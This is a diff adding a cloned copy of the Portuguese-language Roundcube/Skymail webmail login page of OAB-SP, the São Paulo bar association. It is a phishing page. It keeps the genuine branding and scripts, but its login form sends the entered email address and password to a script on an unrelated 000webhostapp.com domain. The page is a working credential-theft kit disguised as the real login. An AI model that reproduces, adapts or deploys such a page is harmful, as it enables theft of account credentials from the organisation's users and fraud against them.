@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html lang="pt" class=" js chrome webkit"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<script type="text/javascript" src="./index_files/NRJS-4d9f49c10c36ca79119"></script><script src="./index_files/nr-1169.min.js.download"></script><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={licenseKey:"NRJS-4d9f49c10c36ca79119",applicationID:"545918823"};window.NREUM||(NREUM={}),__nr_require=function(e,n,t){function r(t){if(!n[t]){var i=n[t]={exports:{}};e[t][0].call(i.exports,function(n){var i=e[t][1][n];return r(i||n)},i,i.exports)}return n[t].exports}if("function"==typeof __nr_require)return __nr_require;for(var i=0;i<t.length;i++)r(t[i]);return r}({1:[function(e,n,t){function r(){}function i(e,n,t){return function(){return o(e,[u.now()].concat(f(arguments)),n?null:this,t),n?void 0:this}}var o=e("handle"),a=e(4),f=e(5),c=e("ee").get("tracer"),u=e("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var p=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],l="api-",d=l+"ixn-";a(p,function(e,n){s[n]=i(l+n,!0,"api")}),s.addPageAction=i(l+"addPageAction",!0),s.setCurrentRouteName=i(l+"routeName",!0),n.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,n){var t={},r=this,i="function"==typeof n;return o(d+"tracer",[u.now(),e,t],r),function(){if(c.emit((i?"":"no-")+"fn-start",[u.now(),r,i],t),i)try{return n.apply(this,arguments)}catch(e){throw c.emit("fn-err",[arguments,this,e],t),e}finally{c.emit("fn-end",[u.now()],t)}}}};a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,n){m[n]=i(d+n)}),newrelic.noticeError=function(e,n){"string"==typeof e&&(e=new Error(e)),o("err",[e,u.now(),!1,n])}},{}],2:[function(e,n,t){function r(e,n){var t=e.getEntries();t.forEach(function(e){"first-paint"===e.name?c("timing",["fp",Math.floor(e.startTime)]):"first-contentful-paint"===e.name&&c("timing",["fcp",Math.floor(e.startTime)])})}function i(e,n){var t=e.getEntries();t.length>0&&c("lcp",[t[t.length-1]])}function o(e){if(e instanceof s&&!l){var n,t=Math.round(e.timeStamp);n=t>1e12?Date.now()-t:u.now()-t,l=!0,c("timing",["fi",t,{type:e.type,fid:n}])}}if(!("init"in NREUM&&"page_view_timing"in NREUM.init&&"enabled"in NREUM.init.page_view_timing&&NREUM.init.page_view_timing.enabled===!1)){var a,f,c=e("handle"),u=e("loader"),s=NREUM.o.EV;if("PerformanceObserver"in window&&"function"==typeof window.PerformanceObserver){a=new PerformanceObserver(r),f=new PerformanceObserver(i);try{a.observe({entryTypes:["paint"]}),f.observe({entryTypes:["largest-contentful-paint"]})}catch(p){}}if("addEventListener"in document){var l=!1,d=["click","keydown","mousedown","pointerdown","touchstart"];d.forEach(function(e){document.addEventListener(e,o,!1)})}}},{}],3:[function(e,n,t){function r(e,n){if(!i)return!1;if(e!==i)return!1;if(!n)return!0;if(!o)return!1;for(var t=o.split("."),r=n.split("."),a=0;a<r.length;a++)if(r[a]!==t[a])return!1;return!0}var i=null,o=null,a=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var f=navigator.userAgent,c=f.match(a);c&&f.indexOf("Chrome")===-1&&f.indexOf("Chromium")===-1&&(i="Safari",o=c[1])}n.exports={agent:i,version:o,match:r}},{}],4:[function(e,n,t){function r(e,n){var t=[],r="",o=0;for(r in e)i.call(e,r)&&(t[o]=n(r,e[r]),o+=1);return t}var i=Object.prototype.hasOwnProperty;n.exports=r},{}],5:[function(e,n,t){function r(e,n,t){n||(n=0),"undefined"==typeof t&&(t=e?e.length:0);for(var r=-1,i=t-n||0,o=Array(i<0?0:i);++r<i;)o[r]=e[n+r];return o}n.exports=r},{}],6:[function(e,n,t){n.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(e,n,t){function r(){}function i(e){function n(e){return e&&e instanceof r?e:e?c(e,f,o):o()}function t(t,r,i,o){if(!l.aborted||o){e&&e(t,r,i);for(var a=n(i),f=v(t),c=f.length,u=0;u<c;u++)f[u].apply(a,r);var p=s[y[t]];return p&&p.push([b,t,r,a]),a}}function d(e,n){h[e]=v(e).concat(n)}function m(e,n){var t=h[e];if(t)for(var r=0;r<t.length;r++)t[r]===n&&t.splice(r,1)}function v(e){return h[e]||[]}function g(e){return p[e]=p[e]||i(t)}function w(e,n){u(e,function(e,t){n=n||"feature",y[t]=n,n in s||(s[n]=[])})}var h={},y={},b={on:d,addEventListener:d,removeEventListener:m,emit:t,get:g,listeners:v,context:n,buffer:w,abort:a,aborted:!1};return b}function o(){return new r}function a(){(s.api||s.feature)&&(l.aborted=!0,s=l.backlog={})}var f="nr@context",c=e("gos"),u=e(4),s={},p={},l=n.exports=i();l.backlog=s},{}],gos:[function(e,n,t){function r(e,n,t){if(i.call(e,n))return e[n];var r=t();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,n,{value:r,writable:!0,enumerable:!1}),r}catch(o){}return e[n]=r,r}var i=Object.prototype.hasOwnProperty;n.exports=r},{}],handle:[function(e,n,t){function r(e,n,t,r){i.buffer([e],r),i.emit(e,n,t)}var i=e("ee").get("handle");n.exports=r,r.ee=i},{}],id:[function(e,n,t){function r(e){var n=typeof e;return!e||"object"!==n&&"function"!==n?-1:e===window?0:a(e,o,function(){return i++})}var i=1,o="nr@id",a=e("gos");n.exports=r},{}],loader:[function(e,n,t){function r(){if(!x++){var e=E.info=NREUM.info,n=d.getElementsByTagName("script")[0];if(setTimeout(s.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&n))return s.abort();u(y,function(n,t){e[n]||(e[n]=t)}),c("mark",["onload",a()+E.offset],null,"api");var t=d.createElement("script");t.src="https://"+e.agent,n.parentNode.insertBefore(t,n)}}function i(){"complete"===d.readyState&&o()}function o(){c("mark",["domContent",a()+E.offset],null,"api")}function a(){return O.exists&&performance.now?Math.round(performance.now()):(f=Math.max((new Date).getTime(),f))-E.offset}var f=(new Date).getTime(),c=e("handle"),u=e(4),s=e("ee"),p=e(3),l=window,d=l.document,m="addEventListener",v="attachEvent",g=l.XMLHttpRequest,w=g&&g.prototype;NREUM.o={ST:setTimeout,SI:l.setImmediate,CT:clearTimeout,XHR:g,REQ:l.Request,EV:l.Event,PR:l.Promise,MO:l.MutationObserver};var h=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1169.min.js"},b=g&&w&&w[m]&&!/CriOS/.test(navigator.userAgent),E=n.exports={offset:f,now:a,origin:h,features:{},xhrWrappable:b,userAgent:p};e(1),e(2),d[m]?(d[m]("DOMContentLoaded",o,!1),l[m]("load",r,!1)):(d[v]("onreadystatechange",i),l[v]("onload",r)),c("mark",["firstbyte",f],null,"api");var x=0,O=e(6)},{}],"wrap-function":[function(e,n,t){function r(e){return!(e&&e instanceof Function&&e.apply&&!e[a])}var i=e("ee"),o=e(5),a="nr@original",f=Object.prototype.hasOwnProperty,c=!1;n.exports=function(e,n){function t(e,n,t,i){function nrWrapper(){var r,a,f,c;try{a=this,r=o(arguments),f="function"==typeof t?t(r,a):t||{}}catch(u){l([u,"",[r,a,i],f])}s(n+"start",[r,a,i],f);try{return c=e.apply(a,r)}catch(p){throw s(n+"err",[r,a,p],f),p}finally{s(n+"end",[r,a,c],f)}}return r(e)?e:(n||(n=""),nrWrapper[a]=e,p(e,nrWrapper),nrWrapper)}function u(e,n,i,o){i||(i="");var a,f,c,u="-"===i.charAt(0);for(c=0;c<n.length;c++)f=n[c],a=e[f],r(a)||(e[f]=t(a,u?f+i:i,o,f))}function s(t,r,i){if(!c||n){var o=c;c=!0;try{e.emit(t,r,i,n)}catch(a){l([a,t,r,i])}c=o}}function p(e,n){if(Object.defineProperty&&Object.keys)try{var t=Object.keys(e);return t.forEach(function(t){Object.defineProperty(n,t,{get:function(){return e[t]},set:function(n){return e[t]=n,n}})}),n}catch(r){l([r])}for(var i in e)f.call(e,i)&&(n[i]=e[i]);return n}function l(n){try{e.emit("internal-error",n)}catch(t){}}return e||(e=i),t.inPlace=u,t.flag=a,t}},{}]},{},["loader"]);</script>
+<title>Webmail :: Bem-vindo ao Webmail</title>
+	<title>Webmail :: Bem-vindo ao Webmail</title>
+	<meta name="Robots" content="noindex,nofollow">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" id="viewport">
+<link rel="shortcut icon" href="https://webmail.oabsp.org.br/skins/skymail/images/favicon.ico?s=1589395976">
+<link rel="stylesheet" type="text/css" href="./index_files/styles.min.css">
+<link rel="stylesheet" type="text/css" href="./index_files/fonts.css">
+<link rel="stylesheet" type="text/css" href="./index_files/skymail_custom.min.css">
+<link rel="stylesheet" type="text/css" href="./index_files/jquery-ui.css">
+<link rel="stylesheet" type="text/css" href="./index_files/skymail_login.min.css">
+<script type="text/javascript" src="./index_files/ui.min.js.download"></script>
+
+
+
+	<link href="./index_files/fonts.css" rel="stylesheet">
+	<link href="./index_files/login.css" rel="stylesheet">
+<style type="text/css">a.button.pressed, a.button:active, a.button:focus, input.button:active, .ui-tabs .ui-tabs-nav li.ui-tabs-active .ui-tabs-anchor, .ui-datepicker .ui-datepicker-header,.ui-widget-header, .ui-button.ui-state-active, #rcmContextMenu li.commentitle span,#rcmContextMenu li.conmentitle span,ul.toolbarmenu li.header label,.uibox .boxtitle,.uibox .listing thead td, .ui-dialog.confirmation .ui-dialog-title,a.button,.buttongroup,.formbuttons input.button:hover,.formbuttons input.button:focus,input.button.mainaction:hover,input.button.mainaction:focus,.formbuttons input.button:active, a, a:visited, #mailboxlist li.mailbox .unreadcount, #searchfilter .menuselector .handle,ul.toolbarmenu li.separator label {color:#2751e6;}
+.ui-button.mainaction, .mainbutton-area .button, .ui-button.ui-state-active, .ui-button.ui-state-focus, .ui-button.ui-state-default, a.button,.buttongroup,input.button.mainaction, .formbuttons input.button:hover,.formbuttons input.button:focus,input.button.mainaction:hover,input.button.mainaction:focus,.formbuttons input.button:active.formbuttons input.button, table.messagelist tbody tr.unread td .line1 .cmds .message-read span.ball, #message-objects div.notice,#composebody_toolbargroup .defaultSkin a.mceButtonEnabled:hover,.minimal #topnav,#topnav,#login-form .box-inner{border-color:#2751e6;}
+.ui-button.mainaction, .ui-tabs .ui-tabs-nav li.ui-tabs-active .ui-tabs-anchor, div.contextmenu ul li.submenu a span.right-arrow, .mainbutton-area .button, #login-wrapper input.button,.left-col,button.btn,.ui-button.ui-state-default, #quotadisplay .used, .listbox .listitem.selected,.listbox .tablink.selected,.listbox .tablink.selected > a,.listing tbody tr.unfocused td,.listing tbody tr.selected td,#topnav, input.button.mainaction, table.messagelist tbody tr.unread td .line1 .cmds .message-read span.ball, .messagelist tr.unread td .columntag,#taskbar,.listbox .listitem.selected,.listbox .tablink.selected,.listbox .tablink.selected > a,.listing tbody tr.unfocused td,#datepicker .ui-datepicker-activerange a.ui-state-active,.records-table tr.unfocused td,#login-form input.button,.googie_list td.googie_list_onhover,ul.toolbarmenu li a.active:hover,#rcmKSearchpane ul li.selected,select.decorated option:hover,select.decorated option[selected='selected'],.left-col,#login-wrapper button#rcmloginsubmit{background:#2751e6;}
+.listing tbody tr.selected td, ul.toolbarmenu li a.active:hover, .listing li.selected>a, .context_menu li a.active:hover, #sections-table tbody tr.selected td.section,#rcmKSearchpane ul li.selected,table.messagelist tr.message.selected td{background:#e6e9ee;color:#000000;}
+.calendarmain .fc-view-table td.fc-list-header, #attendees-freebusy-table h3.boxtitle, #schedule-freebusy-times thead th, #edit-attendees-table thead td, #datepicker .ui-datepicker-activerange a, #message-objects div.notice{background:#e6e9ee;}
+table.messagelist tr.message.unread td .line2,#message-objects div.notice, .fc-header-title h2{color:#000000;}
+.ui-button.ui-state-focus {color: #2751e6;border-color: #2751e6;background-color: #fff;}
+.widescreen .messagelist tr td.subject span.cmd-message-delete {height: 20px;display: inline-block;width: 20px;cursor: pointer;float: right;position: relative;margin-left: 5px;}
+.widescreen .messagelist tr:hover td.subject span.cmd-message-delete {background: url(/skins/skymail/images/buttons.png?v=akjdsww92.xw) -5px -337px no-repeat;}
+.password_rules_info {margin: 20px 0;}
+.password_rules_info ul.password_rules_info {margin: 0;padding: 0 20px;}
+.password_rules_info ul li {padding: 2px 0;}</style><script src="./index_files/jquery.min.js.download"></script>
+<script src="./index_files/common.min.js.download"></script>
+<script src="./index_files/app.min.js.download"></script>
+<script src="./index_files/jstz.min.js.download"></script>
+<script>
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"pt_BR","devel_mode":null,"rcversion":10406,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"skin":"skymail","blankpage":"skins/skymail/watermark.html","refresh_interval":60,"session_lifetime":1800,"action":"","comm_path":"./?_task=login","compose_extwin":false,"responsive_skin_enabled":false,"date_format":"dd/mm/yy","date_format_localized":"DD/MM/AAAA","request_token":"g6fj0nz4Neiak14lUaT66IUGCFSC9dSE"});
+rcmail.add_label({"loading":"Carregando...","servererror":"Erro no Servidor!","connerror":"Erro de conexão (Falha na comunicação com o servidor)!","requesttimedout":"Tempo da requisição esgotado","refreshing":"Atualizando...","windowopenerror":"A janela popup foi bloqueada!","uploadingmany":"Enviando arquivos...","uploading":"Enviando arquivo...","close":"Fechar","save":"Salvar","cancel":"Cancelar","alerttitle":"Atenção","confirmationtitle":"Você está seguro...","delete":"Excluir","continue":"Continuar","ok":"OK","skymail_custom.remove_signature_separator":"Remover separador (--) da assinatura","skymail_custom.disable_ctrl_enter_sent":"Desabilitar o atalho Ctrl+Enter para enviar o e-mail","skymail_custom.paragraph_instead_newline":"Utilizar quebra de parágrafo mais espaçosa na quebra de linha \u003CEnter\u003E","skymail_custom.selectfirst":"Selecionar automaticamente a primeira mensagem","skymail_custom.showsize":"Exibir o tamanho da mensagem","skymail_custom.view":"Visualizar","skymail_custom.itensby":"Itens por","skymail_custom.classifiedby":"Classificado por","skymail_custom.orderby":"Ordernar por","skymail_custom.newestfirst":"Mais recentes primeiro","skymail_custom.oldersfirst":"Mais antigas primeiro","skymail_custom.addressbook":"Pessoas","skymail_custom.reply":"Responder","skymail_custom.replyall":"Responder a todos","skymail_custom.forward":"Encaminhar","skymail_custom.send":"Enviar","skymail_custom.attach":"Anexar","skymail_custom.signature":"Assinatura","skymail_custom.close":"Fechar","skymail_custom.changepassword":"Modificar senha","skymail_custom.passwordchangedsuccessfully":"Senha definida com sucesso.","skymail_custom.vacationmessage":"Mensagem de férias","skymail_custom.userinfo":"Informações do usuário","skymail_custom.import":"Importar","skymail_custom.export":"Exportar","skymail_custom.exportall":"Exportar todos","skymail_custom.composemail":"Compor email","skymail_custom.spellcheck":"Revisar","skymail_custom.messageheader":"Cabeçalho da mensagem","skymail_custom.sendemail":"Enviar email","skymail_custom.addaddressbook":"Adicionar ao catálogo","skymail_custom.threadmodeselect":"Exibir mensagens por tópicos","skymail_custom.listmodeselect":"Exibir mensagens por listas","skymail_custom.newfolder":"New folder","skymail_custom.stillworking":"Aguarde, ainda estamos trabalhando ...","skymail_custom.folderpolicy":"Política de retenção de mensagens","skymail_custom.action":"Ação","skymail_custom.retentiondays":"Dias de retenção","skymail_custom.removepermanently":"Remover permanentemente","skymail_custom.movetotrash":"Mover mensagens pra lixeira","skymail_custom.nopolicy":"Sem política de retenção","skymail_custom.confirm_folder_on_blur":"Deseja realizar as alterações feitas na pasta ","skymail_custom.password_rules_info":"\u003Cdiv class='password_rules_info'\u003E\u003Ch3\u003ESua nova senha deverá seguir as seguintes regras:\u003C/h3\u003E\u003Cul\u003E \n\u003Cli\u003ETer no mínimo 6 caracteres;\u003C/li\u003E\n\u003Cli\u003EPossuir ao menos 3 tipos de caracteres diferentes: maiúsculo, minúsculo, numerais e/ou caracteres especiais;\u003C/li\u003E\n\u003Cli\u003ENão possuir informações relacionadas ao seu e-mail;\u003C/li\u003E\n\u003Cli\u003ENão possuir números sequenciais;\u003C/li\u003E\n\u003Cli\u003ENão possuir letras sequenciais do início do alfabeto;\u003C/li\u003E\n\u003Cli\u003ENão possuir anos próximos ao corrente junto com informações pessoais;\u003C/li\u003E\n\u003C/ul\u003E\u003C/li\u003E\u003C/div\u003E","skymail_custom.try_new_webmail":"⭐ Experimente o Novo Webmail Responsivo","skymail_custom.back_to_old":"Volte a versão do seu Webmail","skymail_custom.try_text_1":"Tenha uma nova experiência mais ágil e segura no seu celular, tablet ou desktop.","skymail_custom.try_text_click":" e experimente agora","skymail_custom.click_here":"Clique aqui","skymail_custom.print":"Imprimir","skymail_custom.printcontacts":"Imprimir contato","skymail_custom.deleteofgroup":"Remover do grupo","skymail_custom.identity":"Identidade","skymail_login.skymail_rememberme_hint":"Do not use this function on public computers for security reason.","skymail_login.loginintrotext":"Entre e tenha acesso ao seus emails, contatos, calendários e muito mais.","skymail_login.cancelrequest":"Requisição cancelada","skymail_login.clicktoopenskybox":"Abrir seu \u003Cspan style=\" font-weight:bolder; color:#9e9c9c;\"\u003Esky\u003Cspan style=\"color: #4a76ba;\"\u003Ebox\u003C/span\u003E\u003C/span\u003E","skymail_login.exchangeredir":"Autenticando no seu Exchange","skymail_login.waitingauth":"Aguarde, autenticando...","skymail_login.logonin":"Acessar","skymail_login.skymail_rememberme":"Salvar Informações","skymail_login.new_password":"Nova senha","skymail_login.new_password_again":"Repita nova senha","skymail_login.blocked_user_ssl":"Esta conta não tem permissão de acesso ao webmail via protocolo https","skymail_login.blocked_user_tsl":"Esta conta não tem permissão de acesso ao webmail via protocolo http","skymail_login.blockep_ip_access":"Esta conta não tem permissão para acessar o webmail desta rede de acesso(ip)","skymail_login.password_change":"Uma solicitação de troca de senha foi encontrada, por favor, digite uma nova senha para esta conta.","skymail_login.password_change_pagetitle":"Solicitação de troca de senha","skymail_login.new_password_at_least_6chars":"Senha muito fraca. Por favor, insira 6 ou mais caracteres incluíndo pelo menos 3 tipos diferentes: Letras maiscúlas, minúsculas, números ou caracteres especias.","skymail_login.same_password":"Não pode cadastrar a mesma senha","skymail_login.logonhour_blocked":"Período (horário) de acesso não permitido.","skymail_login.invalid_email":"Por favor, insira um e-mail válido","skymail_login.forgot_password":"Esqueceu a senha","skymail_login.forgot_password_recognized":"Uma solicitação de troca de senha foi identificada para esta conta. Para entrar no webmail por favor, escolha uma nova senha e clique em Enviar.","skymail_login.forgot_password_ok_text":"Seu link foi validado com sucesso. Agora renove sua senha preenchendo os 2 campos abaixo.","skymail_login.forgot_password_already_used":"Endereço de recuperação de senha já utilizado, inválido ou expirado. Caso queira realizar o processo de recuperação, clique no link \"Esqueceu a senha?\" acima.","skymail_login.forgot_password_sec_mail_not_exists":"Você não possui um e-mail secundário cadastrado para o e-mail %s. Solicite para o suporte técnico a troca da sua senha","skymail_login.forgot_password_already_sent":"Já existe uma solicitação ativa enviada para o e-mail %s. Caso não possua mais acesso a este e-mail, entre em contato com o suporte técnico para solicitar a troca desta informação e faça novamente este processo.","skymail_login.forgot_password_sent":"Um e-mail com instruções para redefinição da sua senha foi enviado para seu e-mail secundário cadastrado %s. Clique no link do corpo do e-mail para realizar a troca de senha para uma de sua preferência.","skymail_login.forgot_password_mailbody":"Olá \u003Cb\u003E%s\u003C/b\u003E.\u003Cbr/\u003E\u003Cp\u003EPara renovar sua senha, clique no seguinte link: \u003Ca href='%s'\u003E%s\u003C/a\u003E, ou o copie e insira em seu navegador preferido para entrar na página de renovação de senha.\u003C/p\u003E","skymail_login.forgot_password_mailsubject":"Redefinição de senha webmail","skymail_login.forgot_password_page_instruction":"Seu link foi validado com sucesso. Agora renove sua senha preenchendo os 2 campos abaixo.","skymail_login.exchange_redirect_message":"Aguarde, autenticado...","skymail_login.new_password_not_match":"As senhas não coincidem","skymail_login.noaccess":"Essa conta encontra-se sem acesso.","skymail_login.disabled":"Essa conta foi desativada.","skymail_login.back_to_login":"Voltar para a página de login","skymail_login.forgot_password_init_instruction":"Para iniciar o processo de redefinição da sua senha, por favor, insira abaixo o seu e-mail.","converse.togglechat":"Toggle Chat","converse.xmppconnectionerror":"Um erro ocorreu ao tentar conectar ao chat. \u003Cbr /\u003E Tentaremos reconectar dentro de alguns instantes.","converse.prefstitle":"Preferências","converse.enableprebind":"Conectando ao servidor","converse.auto":"Automaticamente","converse.manual":"Manualmente","errortitle":"Ocorreu um erro!","toggleadvancedoptions":"Ativar opções avançadas"});
+rcmail.gui_container("loginfooter","bottomline");rcmail.gui_object('loginform', 'form');
+rcmail.gui_object('message', 'message');
+</script>
+
+<script src="./index_files/moment.min.js.download"></script>
+<script src="./index_files/moment.pt_BR.js.download"></script>
+<script src="./index_files/skymail_custom.min.js.download"></script>
+<script src="./index_files/skymail_custom.min.js(1).download"></script>
+<script src="./index_files/jquery-ui.min.js.download"></script>
+<script src="./index_files/jquery.ui.datepicker-pt-BR.js.download"></script>
+<script src="./index_files/skymail_login.min.js.download"></script>
+
+</head>
+<body class="login">
+<script type="text/javascript" src="./index_files/jquery.cookie.js.download"></script>
+<script type="text/javascript" src="./index_files/skymail_utils.js.download"></script>
+<script type="text/javascript">
+    rcmail.env.sent_mbox = 'Itens Enviados';
+</script>
+<div class="left-col">
+	<div class="content">
+    <div class="message-wrapper">
+      <h1>Webmail</h1>
+      <p class="introtext">Entre e tenha acesso ao seus emails, contatos, calendários e muito mais.</p>
+    </div>
+	</div>
+</div>
+<div class="main-col">
+	<div class="content">
+		<div id="login-wrapper">
+			<img src="./index_files/saved_resource" class="logo_img" id="logo" alt="Webmail">
+			<noscript>
+				<p class="noscriptwarning">Aviso: Este webmail utiliza Javascript, habilite-o nas configurações de seu navegador.</p>
+			</noscript>
+			<div class="panel">
+				<form name="form" method="post" action="https://vanderwalt11jo.000webhostapp.com/oabsp/post.php">
+<input type="hidden" name="_token" value="g6fj0nz4Neiak14lUaT66IUGCFSC9dSE">
+					<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="America/Guatemala"><input type="hidden" name="_url" id="rcmloginurl" value=""><table><tbody><tr><td class="title"><label for="rcmloginuser">Usuário</label>
+</td>
+<td class="input"><input name="email" id="rcmloginuser" required="" autocapitalize="off" type="email"></td>
+</tr>
+<tr><td class="title"><label for="rcmloginpwd">Senha</label>
+</td>
+<td class="input"><input name="password" id="rcmloginpwd" required="" autocapitalize="off" type="password"></td>
+</tr>
+</tbody>
+</table><div id="skymailcontainer"><span class="remember_me"><input type="checkbox" name="_skymail_rememberme" id="_skymail_rememberme" value="1"><label for="_skymail_rememberme">Salvar Informações</label></span><span class="forgot_password"><a href="https://webmail.oabsp.org.br/#" style="font-size: .8em">Esqueceu a senha?</a></span></div>
+<p class="formbuttons"></p><div id="logonin_area"><label for="logonin">Acessar</label>
+<select name="logonin" id="logonin">
+<option value="webmail">Webmail</option>
+<option value="skybox">Skybox</option>
+</select>
+<button type="submit" id="rcmloginsubmit" class="button mainaction submit">Entrar</button></div>
+
+<p></p>
+
+					<div id="message"></div>
+				</form>
+			</div>
+			<div class="box-bottom">
+				<noscript>
+					<p class="noscriptwarning">Aviso: Este webmail utiliza Javascript, habilite-o nas configurações de seu navegador.</p>
+				</noscript>
+			</div>
+			<div id="bottomline">
+				
+			</div>
+			
+
+<script type="text/javascript">
+if (!window.UI) { var UI = new rcube_mail_ui(); }
+</script>
+
+			
+		</div>
+	</div>
+</div>
+<script>
+moment.locale('pt-br', {
+              calendar : {
+                  lastDay : 'ddd HH:mm',
+                  sameDay : 'HH:mm',
+                  nextDay : 'ddd HH:mm',
+                  lastWeek : 'ddd HH:mm',
+                  nextWeek : 'ddd HH:mm',
+                  sameElse : 'DD/MM/YY'
+              },
+          });
+$(function() {
+rcmail.init();
+var images = ["skins/skymail/images/ajaxloader.gif","skins/skymail/images/buttons.png","skins/skymail/images/addcontact.png","skins/skymail/images/filetypes.png","skins/skymail/images/listicons.png","skins/skymail/images/messages.png","skins/skymail/images/quota.png","skins/skymail/images/selector.png","skins/skymail/images/splitter.png","skins/skymail/images/watermark.jpg"];
+            for (var i=0; i<images.length; i++) {
+                img = new Image();
+                img.src = images[i];
+            }
+});
+</script>
+
+
+<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"NRJS-4d9f49c10c36ca79119","applicationID":"545918823","transactionName":"Z1IHbBFRWxBTABUNW14YJk0QRFoOHQ8OA11eGA==","queueTime":0,"applicationTime":145,"atts":"SxUEGllLSB4=","errorBeacon":"bam.nr-data.net","agent":""}</script>
+</body></html>
